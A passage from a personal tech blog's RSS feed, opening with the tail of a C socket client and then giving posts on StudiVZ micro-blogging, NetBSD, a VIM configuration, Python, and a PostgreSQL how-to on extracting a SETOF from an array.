   <span style="color:#6ab825;font-weight:bold">if</span> (recv(sock, &amp;login_data, <span style="color:#3677a9">200</span>, <span style="color:#3677a9">0</span>) &amp;lt; <span style="color:#3677a9">1</span>) {
      die(<span style="color:#ed9d13">&#34;Mismatch in number of received bytes&#34;</span>);
   }

   fprintf(stdout,<span style="color:#ed9d13">&#34;login: %s</span>
<span style="color:#ed9d13">&#34;, login_data);</span>

   <span style="color:#999;font-style:italic">/*  Free addrinfo structure */</span>
   freeaddrinfo(servinfo);

   <span style="color:#999;font-style:italic">/* Close connection */</span>
   close(sock);
   exit(<span style="color:#3677a9">0</span>);
}

</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Der Buschfunk kommt</title>
      <link>https://blog.dornea.nu/2009/05/07/der-buschfunk-kommt/</link>
      <pubDate>Thu, 07 May 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/05/07/der-buschfunk-kommt/</guid>
      <content:encoded><![CDATA[<p>Wozu denn die ganze Aufregung Ã¼ber das neue Feature von StudiVZ? Der Name mag ja einen total verwirren, hat aber nichts mit mittelafrikanischer Kommunikationskultur zu tun. <strong>Micro-Blogging</strong> nennt sich das Ganze und soll zum einen die User darÃ¼ber informieren, was in ihrer NÃ¤he (gemeint sind ihre Kontakte bei <a href="http://vz.net">VZ</a>) alles passiert (ist) und zum anderen ihnen die MÃ¶glichkeit bieten, ihre Freunde auf dem Laufenden zu Halten.</p>
<blockquote>
<p>&ldquo;Ich bin einkaufen!&rdquo;
&ldquo;Ich lerne wie ein Weltmeister&hellip;&rdquo;</p>
</blockquote>
<p>etc. Leider hat sich die eine groÃŸe Mehrheit eher darÃ¼ber beschwert als gefreut.</p>
<blockquote>
<p>&ldquo;Was soll der ScheiÃŸ?ScheiÃŸ-Twitter-Kopie&rdquo;</p>
</blockquote>
<p>waren gÃ¤ngige Kommentare. Ich nehm es mit groÃŸer Gelassenheit&hellip;</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>NetBSD rulez!</title>
      <link>https://blog.dornea.nu/2009/05/05/netbsd-rulez/</link>
      <pubDate>Tue, 05 May 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/05/05/netbsd-rulez/</guid>
      <content:encoded><![CDATA[<p>I just started installing NetBSD on my 2nd laptop. Everything works like a charm! (thanks L. for your support xD) I was kind of sick of Linux/Debian and wanted to try something new. I made my decision and installed NetBSD due to its high portability: &ldquo;Of course it runs NetBSD!&rdquo; I heard Thinkpads are very well supported by NetBSD but I need to accomodate to the new system and do some testings before installing it on my main working machine. I managed it to install the base system plus some extras like FluxBox and Firefox. Some last words for this article? <code>make install clean</code></p>
<p><img src="/posts/img/2010/211/blacktiny.jpg" alt="blacktiny"></p>
<p><img src="/posts/img/2010/211/NetBSD-5.0.1-AMD64.png" alt="netbsd desktop"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Turn VIM into your favourite IDE</title>
      <link>https://blog.dornea.nu/2009/04/24/turn-vim-into-your-favourite-ide/</link>
      <pubDate>Fri, 24 Apr 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/04/24/turn-vim-into-your-favourite-ide/</guid>
      <content:encoded><![CDATA[<p>Before you start reading this I&rsquo;d recommand you to ask your best friend Googleâ„¢ for the most common (platform independent) <a href="http://en.wikipedia.org/wiki/Integrated_development_environment" title="Wiki IDE">IDE</a>s (Integrated Development Environment). If you want some top 10 of most featured/used/known/whatever IDEs go to <a href="http://en.wikipedia.org/wiki/Comparison_of_integrated_development_environments" title="Comparison of IDEs">Wikipedia</a> and satisfy your needs. So don&rsquo;t get me wrong: This article is NOT supposed to give you some comparison nor to influence your oppinion. I&rsquo;ll just satisfy MY needs and give you some kind of reviews in using <a title="Read more about VIM" href="http://en.wikipedia.org/wiki/Vim_(text_editor)" rel="external">VIM</a> for complex projects and daily coding tasks.</p>
<p>So why using VIM at all? Isn&rsquo;t that some ancient Unix editor used by the most geeks out there? Well like other many other things in this world, VIM seems to be some kind of ageless editor. I really tried to get some sincere answer why I&rsquo;m still addicted to VIM. When dealing with software development most coders will mention <a href="http://www.eclipse.org/" title="More about Eclipse">Eclipse</a> or <a href="http://www.netbeans.org/" title="More about Netbeans">Netbeans</a>. The competition between them is quite intense because those products have the most active communities of user. Of the primary players out there (including <a href="http://www.jetbrains.com/idea/" title="More about IntelliJ IDEA">InteliJ IDEA</a> of Oracle) only Eclipse and Netbeans are free and open source. I&rsquo;ve been using Netbeans for a long time. My oppionion: A really good (open source) IDE. I really disliked Eclipse in cause of its extremly bloated look. But the main reason for using Netbeans instead of Eclipse was my 12.1&quot; Laptop.If I had some larger display maybe I&rsquo;ll be using Eclipse too. It has a big potential and some really cool features. Ok, I think I wrote enough about the so called big &ldquo;primary players*. Let us take a look at VIM, the lighty IDE with cool features. Since VIMs <a href="http://www.vim.org/htmldoc/term.html#mouse-using" title="VIM Mouse support">mouse</a> support things became a lot easier. You can use contoll VIM by your mouse! It works under xterm and other several terminals. All you&rsquo;ll have to to is to set following option:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">:set mouse=a
</code></pre></div><p>First of all let me show you what VIM is capable of. Left to this text you have some screenshot I made on my Debian/Linux. I splitted the main window into several windows and loaded source codes into them. Before doing that I activated the mouse support (see above) in order to simplify the file loading process. On the left most side of the screen you see some files listes in the current working directory. Once I&rsquo;ve clicked on some item in the the current working window, it splitted horizontally (default behaviour) and loaded the selected file. In order to spn lit vertically you&rsquo;ll have to use the <code>vsp</code> command. Fur further info just take a look at the documentation. There are a lot of information shown in each splitted window like e.g. the lines number, file name, current cursor position etc. Here you have my VIM configuration file <code>~/.vimrc</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">set t_Co=256
syntax on
colorscheme leo
set tabstop=3
set shiftwidth=3
set expandtab
set number
</code></pre></div><p>If you really like my colorscheme just download it at <a href="http://www.vim.org/scripts/script.php?script_id=2156" title="colorscheme leo">http://www.vim.org/scripts/script.php?script_id=2156</a>. Put it into <code>~/.vim/colors/</code> and then activate it using <code>:colorscheme leo</code>. It really has cool colors and preserves your tired eyes and boosts your motivation why programming. The mentioned file manager is called <strong>NERDTree</strong> and can be downloaded <a href="http://www.vim.org/scripts/script.php?script_id=1658">here</a>. Once you have activated the mouse support and created several windows splits you can now select the splits by mouse or resize them. In order to do that just simply select the splits border (the blue line in the left screenshot) and move it vertically to your desired position. I hope you&rsquo;ll have fun playing with VIM (take your time like I did) and discover its (unknown?) IDE capabilities. You&rsquo;ll soon be fascinated by the vast posibilities this editor offers you. Feel free to <a href="http://www.google.com/search?hl=en&amp;q=vim+IDE">Google</a> for some other blog posts. I&rsquo;m glad I&rsquo;m not the only one geek out there addicted to VIM.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Why use Python? The n00b mini-review</title>
      <link>https://blog.dornea.nu/2009/04/07/why-use-python-the-n00b-mini-review/</link>
      <pubDate>Tue, 07 Apr 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/04/07/why-use-python-the-n00b-mini-review/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;ve been coding Python for almost one week. I really thank O&rsquo;Reilly for their good quality and well structured books. If you ever plan to learn Python, just have a look at &ldquo;Learning Python - 3rd Edition&rdquo; by Mark Lutz. You&rsquo;ll love it! And you&rsquo;ll really get impressed and fascinated by Pythons vast functionalities like I did.</p>
<p>So what&rsquo;s the big thing about Python? Well to be honest my answer is simply: Because it&rsquo;s damn cool. Ok, don&rsquo;t get me wrong, but once you started working with it, you&rsquo;ll ask yourself why the #!?% in the world you didn&rsquo;t do that earlier. When learning this script language, you&rsquo;ll have to watch out for its viperish effect: Once it gets you, it will never let you loose. Ok, let&rsquo;s get more serious.</p>
<p>Like already mentioned, I&rsquo;m still a Python newbie. But there are some cool features worth to be mentioned:</p>
<ul>
<li>OOP (Object-Oriented Programming): It can reduce your code and improve your projects usibility. It&rsquo;s all about code reuse and well structured modules. You&rsquo;ll get more maintable code.</li>
<li>Polymorphism: Since almost everything is an <code>object</code> (variables, functions, structures, classes etc.), you can e.g. use classes as structures (like C ones) by typing: myclass.variable_inside_class</li>
<li>Runs on many platforms: Linux, Windows, Max OSX, but also Java and .NET machines</li>
<li>Huge standard (comprehensive) library</li>
<li>GOOD DOCUMENTATION (!)</li>
<li>Automatic garbage collection</li>
<li>&hellip;</li>
</ul>
<p>So what are YOUR reasons? Why do YOU use Python? Just drop some comments..</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Get SETOF from Array in PostgreSQL</title>
      <link>https://blog.dornea.nu/2009/03/30/howto-get-setof-from-array-in-postgresql/</link>
      <pubDate>Mon, 30 Mar 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/03/30/howto-get-setof-from-array-in-postgresql/</guid>
      <content:encoded><![CDATA[<p>The use of so called &ldquo;procedural languages&rdquo; in PostgreSQL allows the user to write user-defined functions in other languages than SQL or C. Since every query is sent to the server, the database server has to know how to interpret and handle function statements. As the PostgreSQL documentation describes, the function handler itself is a C language function compiled into a shared object and loaded on demand. All you have to do is to install the <em>language</em> into your database. Besides that you&rsquo;ll have to install the pre-compiled shared objects on your system. On my system (Debian 5.0) I had to install the <code>postgresql-plperl</code> package. Afterwars I connected to the database and typed:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span>FUNCTION<span style="color:#666"> </span><span style="color:#447fcf">plpgsql_call_handler</span><span style="color:#666"> </span>()<span style="color:#666">
</span><span style="color:#666">   </span>RETURNS<span style="color:#666"> </span>OPAQUE<span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">AS</span><span style="color:#666"> </span><span style="color:#ed9d13">&#39;/usr/lib/postgresql/8.3/lib/plpgsql.so&#39;</span><span style="color:#666">
</span><span style="color:#666"></span>LANGUAGE<span style="color:#666"> </span><span style="color:#ed9d13">&#39;C&#39;</span>;<span style="color:#666">
</span></code></pre></div><p>Of course you&rsquo;ll have to look up for the right file path in order to work. Finally I was able to use the language <code>plpgsql</code> in my functions. If you need help installing languages just check out the PostgreSQL <a href="http://www.postgresql.org/docs/8.3/static/plpgsql.html">documentation</a> (it helped me too).</p>
<h2 id="polymorphic-types">Polymorphic types</h2>
<p>When speaking of polymorphism in PostgreSQL, we actually refer to the polymorphic functions. So whatâ€™s the difference between a polymorphic type and a polymorphic function? They&rsquo;re related to each other. In fact every function declared to use polymorphic types is called as a polymorphic function. These types (pseudo-types) are <code>anyelement</code> and <code>anyarray</code>. So when arguments of these types are passed to a function, it can handle with different data types. Imagine a function called <code>equal</code> that compares two arguments and returns a boolean:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">or</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">REPLACE</span><span style="color:#666"> </span>FUNCTION<span style="color:#666"> </span><span style="color:#447fcf">equal</span><span style="color:#666"> </span>(anyelement,anyelement)<span style="color:#666">
</span><span style="color:#666">  </span>RETURNS<span style="color:#666"> </span>boolean<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">AS</span><span style="color:#666">
</span><span style="color:#666">  </span><span style="color:#a61717;background-color:#e3d2d2">$$</span><span style="color:#666">
</span><span style="color:#666">      </span>...<span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">IF</span><span style="color:#666"> </span><span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#3677a9">1</span><span style="color:#666"> </span>==<span style="color:#666"> </span><span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#3677a9">2</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">THEN</span><span style="color:#666">
</span><span style="color:#666">          </span><span style="color:#6ab825;font-weight:bold">return</span><span style="color:#666"> </span><span style="color:#40ffff">TRUE</span>;<span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">ELSE</span><span style="color:#666">
</span><span style="color:#666">          </span><span style="color:#6ab825;font-weight:bold">return</span><span style="color:#666"> </span><span style="color:#40ffff">FALSE</span>;<span style="color:#666">
</span><span style="color:#666">      </span>END<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">IF</span>;<span style="color:#666">
</span><span style="color:#666">  </span><span style="color:#a61717;background-color:#e3d2d2">$$</span><span style="color:#666">
</span><span style="color:#666"></span>LANGUAGE<span style="color:#666"> </span><span style="color:#ed9d13">&#39;sql&#39;</span>;<span style="color:#666">
</span></code></pre></div><p><code>equal</code> will take 2 input values of the SAME data type. Otherwise how could you e.g. compare a string to an integer? Read <a href="http://www.postgresql.org/docs/current/static/extend-type-system.html">more</a>.</p>
<h2 id="getting-started">Getting started</h2>
<p>I&rsquo;ll use following employees table:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">create</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">table</span><span style="color:#666"> </span><span style="color:#447fcf">t_employee</span><span style="color:#666">
</span><span style="color:#666"></span>(<span style="color:#666">
</span><span style="color:#666">        </span>ID<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">integer</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">        </span>name<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">text</span>,<span style="color:#666">
</span><span style="color:#666">        </span>salary<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">real</span>,<span style="color:#666"> 
</span><span style="color:#666">        </span>start_date<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">date</span>,<span style="color:#666">
</span><span style="color:#666">        </span>city<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">text</span>,<span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#6ab825;font-weight:bold">CONSTRAINT</span><span style="color:#666"> </span>primkey_ID<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">PRIMARY</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">KEY</span><span style="color:#666"> </span>(ID)<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span>)<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">WITH</span><span style="color:#666"> </span>(OIDS=<span style="color:#40ffff">FALSE</span>);<span style="color:#666">
</span></code></pre></div><p>Then we insert some new data into the table:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">INSERT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTO</span><span style="color:#666"> </span><span style="color:#447fcf">t_employee</span>(ID,name,salary,start_date,city)<span style="color:#666"> 
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">VALUES</span><span style="color:#666"> </span>(<span style="color:#3677a9">1</span>,<span style="color:#ed9d13">&#39;Peter&#39;</span>,<span style="color:#ed9d13">&#39;2100&#39;</span>,<span style="color:#ed9d13">&#39;2003-06-19&#39;</span>,<span style="color:#ed9d13">&#39;Stuttgart&#39;</span>);<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">INSERT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTO</span><span style="color:#666"> </span><span style="color:#447fcf">t_employee</span>(ID,name,salary,start_date,city)<span style="color:#666"> 
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">VALUES</span><span style="color:#666"> </span>(<span style="color:#3677a9">2</span>,<span style="color:#ed9d13">&#39;Peter&#39;</span>,<span style="color:#ed9d13">&#39;2100&#39;</span>,<span style="color:#ed9d13">&#39;2003-06-19&#39;</span>,<span style="color:#ed9d13">&#39;Stuttgart&#39;</span>);<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">INSERT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTO</span><span style="color:#666"> </span><span style="color:#447fcf">t_employee</span>(ID,name,salary,start_date,city)<span style="color:#666"> 
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">VALUES</span><span style="color:#666"> </span>(<span style="color:#3677a9">3</span>,<span style="color:#ed9d13">&#39;Marc&#39;</span>,<span style="color:#ed9d13">&#39;1560&#39;</span>,<span style="color:#ed9d13">&#39;2001-02-25&#39;</span>,<span style="color:#ed9d13">&#39;Mannheim&#39;</span>);<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">INSERT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTO</span><span style="color:#666"> </span><span style="color:#447fcf">t_employee</span>(ID,name,salary,start_date,city)<span style="color:#666"> 
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">VALUES</span><span style="color:#666"> </span>(<span style="color:#3677a9">4</span>,<span style="color:#ed9d13">&#39;Stefan&#39;</span>,<span style="color:#ed9d13">&#39;1100&#39;</span>,<span style="color:#ed9d13">&#39;2008-03-14&#39;</span>,<span style="color:#ed9d13">&#39;Hamburg&#39;</span>);<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">INSERT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTO</span><span style="color:#666"> </span><span style="color:#447fcf">t_employee</span>(ID,name,salary,start_date,city)<span style="color:#666"> 
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">VALUES</span><span style="color:#666"> </span>(<span style="color:#3677a9">5</span>,<span style="color:#ed9d13">&#39;Gerd&#39;</span>,<span style="color:#ed9d13">&#39;900&#39;</span>,<span style="color:#ed9d13">&#39;2004-06-24&#39;</span>,<span style="color:#ed9d13">&#39;Hannover&#39;</span>);<span style="color:#666">
</span></code></pre></div><p><code>t_employee</code> will now contain:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">select</span><span style="color:#666"> </span>*<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">from</span><span style="color:#666"> </span>t_employee;<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"> </span>id<span style="color:#666"> </span>|<span style="color:#666">  </span>name<span style="color:#666">  </span>|<span style="color:#666"> </span>salary<span style="color:#666"> </span>|<span style="color:#666"> </span>start_date<span style="color:#666"> </span>|<span style="color:#666">   </span>city<span style="color:#666">    
</span><span style="color:#666"></span>----+--------+--------+------------+---------<span style="color:#999;font-style:italic">--
</span><span style="color:#999;font-style:italic">  1 | John   |   1100 | 2002-05-01 | Berlin
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">  </span><span style="color:#3677a9">2</span><span style="color:#666"> </span>|<span style="color:#666"> </span>Peter<span style="color:#666">  </span>|<span style="color:#666">   </span><span style="color:#3677a9">2100</span><span style="color:#666"> </span>|<span style="color:#666"> </span><span style="color:#3677a9">2003</span>-<span style="color:#3677a9">06</span>-<span style="color:#3677a9">19</span><span style="color:#666"> </span>|<span style="color:#666"> </span>Stuttgart<span style="color:#666">
</span><span style="color:#666">  </span><span style="color:#3677a9">3</span><span style="color:#666"> </span>|<span style="color:#666"> </span>Marc<span style="color:#666">   </span>|<span style="color:#666">   </span><span style="color:#3677a9">1560</span><span style="color:#666"> </span>|<span style="color:#666"> </span><span style="color:#3677a9">2001</span>-<span style="color:#3677a9">02</span>-<span style="color:#3677a9">25</span><span style="color:#666"> </span>|<span style="color:#666"> </span>Mannheim<span style="color:#666">
</span><span style="color:#666">  </span><span style="color:#3677a9">4</span><span style="color:#666"> </span>|<span style="color:#666"> </span>Stefan<span style="color:#666"> </span>|<span style="color:#666">   </span><span style="color:#3677a9">1100</span><span style="color:#666"> </span>|<span style="color:#666"> </span><span style="color:#3677a9">2008</span>-<span style="color:#3677a9">03</span>-<span style="color:#3677a9">14</span><span style="color:#666"> </span>|<span style="color:#666"> </span>Hamburg<span style="color:#666">
</span><span style="color:#666">  </span><span style="color:#3677a9">5</span><span style="color:#666"> </span>|<span style="color:#666"> </span>Gerd<span style="color:#666">   </span>|<span style="color:#666">    </span><span style="color:#3677a9">900</span><span style="color:#666"> </span>|<span style="color:#666"> </span><span style="color:#3677a9">2004</span>-<span style="color:#3677a9">06</span>-<span style="color:#3677a9">24</span><span style="color:#666"> </span>|<span style="color:#666"> </span><span style="color:#447fcf">Hannover</span><span style="color:#666">
</span><span style="color:#666"></span>(<span style="color:#3677a9">5</span><span style="color:#666"> </span>rows)<span style="color:#666">
</span></code></pre></div><p>In the next step we&rsquo;ll try to write a function which returns a SETOF containing our data.</p>
<h2 id="setof-vs-array">SETOF vs. Array</h2>
<p>Now we need a function which returns our data as a SETOF. In my function I can declare <code>l_row</code> of type <code>t_employee</code>(see below). In this variable data is structured as in the table <code>t_employee</code>. So far, no big deal. Just let us have a look at the function:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">or</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">REPLACE</span><span style="color:#666"> </span>FUNCTION<span style="color:#666"> </span><span style="color:#447fcf">get_employee</span>()<span style="color:#666">
</span><span style="color:#666">   </span>RETURNS<span style="color:#666"> </span>SETOF<span style="color:#666"> </span>t_employees<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">AS</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$</span>BODY<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">DECLARE</span><span style="color:#666">
</span><span style="color:#666">   </span>l_row<span style="color:#666"> </span>t_employee;<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span>BEGIN<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#999;font-style:italic">-- Loop through rows
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">FOR</span><span style="color:#666"> </span>l_row<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">IN</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">SELECT</span><span style="color:#666"> </span>*<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">FROM</span><span style="color:#666"> </span>t_employee<span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">LOOP</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#999;font-style:italic">-- Return data
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">RETURN</span><span style="color:#666"> </span>NEXT<span style="color:#666"> </span>l_row;<span style="color:#666">
</span><span style="color:#666">   </span>END<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">LOOP</span>;<span style="color:#666">
</span><span style="color:#666"></span>END;<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$</span>BODY<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#666">
</span><span style="color:#666">   </span>LANGUAGE<span style="color:#666"> </span><span style="color:#ed9d13">&#39;plpgsql&#39;</span>;<span style="color:#666">
</span></code></pre></div><p>Okay. But as you might have noticed, the purpose of this howto ist to show you how to get a SETOF from an array. Therefor we need some array. We&rsquo;ll modify <code>get_employees</code> in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">or</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">REPLACE</span><span style="color:#666"> </span>FUNCTION<span style="color:#666"> </span><span style="color:#447fcf">get_employee</span>()<span style="color:#666">
</span><span style="color:#666">   </span>RETURNS<span style="color:#666"> </span>SETOF<span style="color:#666"> </span>t_employee<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">AS</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$</span>BODY<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">DECLARE</span><span style="color:#666">
</span><span style="color:#666">   </span>l_row<span style="color:#666"> </span>t_employee;<span style="color:#666">
</span><span style="color:#666">   </span>l_array<span style="color:#666"> </span>t_employee[];<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span>BEGIN<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#999;font-style:italic">-- Loop throught rows
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">FOR</span><span style="color:#666"> </span>l_row<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">IN</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">SELECT</span><span style="color:#666"> </span>*<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">FROM</span><span style="color:#666"> </span>t_employee<span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">LOOP</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#999;font-style:italic">-- Put all data into array
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">SELECT</span><span style="color:#666"> </span><span style="color:#447fcf">array_append</span>(l_array,l_row)<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTO</span><span style="color:#666"> </span>l_array;<span style="color:#666">
</span><span style="color:#666">   </span>END<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">LOOP</span>;<span style="color:#666">
</span><span style="color:#666">   </span>...<span style="color:#666">
</span><span style="color:#666"></span>END;<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$</span>BODY<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#666">
</span><span style="color:#666">   </span>LANGUAGE<span style="color:#666"> </span><span style="color:#ed9d13">&#39;plpgsql&#39;</span>;<span style="color:#666">
</span></code></pre></div><p>IN the next step we&rsquo;ll have to extract SETOF data from the array. Since you can&rsquo;t do that with built-in Postgres functions, we&rsquo;ll need some auxiliary function:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#999;font-style:italic">/*
</span><span style="color:#999;font-style:italic">   Polymorphic function &#39;unnest&#39;: ANYARRAY -&amp;gt; SETOF
</span><span style="color:#999;font-style:italic">   Return SETOF from ANYARRAY
</span><span style="color:#999;font-style:italic">*/</span><span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">or</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">REPLACE</span><span style="color:#666"> </span>FUNCTION<span style="color:#666"> </span><span style="color:#447fcf">unnest</span>(ANYARRAY)<span style="color:#666">
</span><span style="color:#666"></span>RETURNS<span style="color:#666"> </span>SETOF<span style="color:#666"> </span>ANYELEMENT<span style="color:#666">
</span><span style="color:#666"></span>LANGUAGE<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">SQL</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">AS</span><span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$$</span><span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">SELECT</span><span style="color:#666"> </span><span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#3677a9">1</span>[i]<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">FROM</span><span style="color:#666"> </span><span style="color:#447fcf">generate_series</span>(<span style="color:#447fcf">array_lower</span>(<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#3677a9">1</span>,<span style="color:#3677a9">1</span>),<span style="color:#447fcf">array_upper</span>(<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#3677a9">1</span>,<span style="color:#3677a9">1</span>))<span style="color:#666"> </span>i;<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$$</span>;<span style="color:#666">
